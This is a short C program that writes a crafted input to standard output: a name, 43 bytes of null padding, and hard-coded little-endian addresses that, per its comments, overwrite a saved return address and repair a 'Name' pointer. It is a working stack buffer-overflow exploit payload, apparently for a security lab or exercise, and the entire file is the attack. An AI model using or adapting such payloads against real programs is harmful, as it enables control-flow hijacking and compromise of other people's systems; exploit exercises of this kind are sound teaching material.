#include <stdio.h>

int main(){
	int i;
	fputs("Chris",stdout);
	
	for(i=0;i<43;i++){fputc('\0',stdout);}
	putchar(0x38);
	
	/*change the return address*/
	putchar(0x68);
	putchar(0x8b);
	putchar(0x04);
	putchar(0x08);
	

	/*fix the Name address*/
	putchar(0xe0);
	putchar(0x65);
	putchar(0x0d);
	putchar(0x08);
		
	/*insert a new line to terminate the input loop*/
	putchar('\n');

	return 0;
}
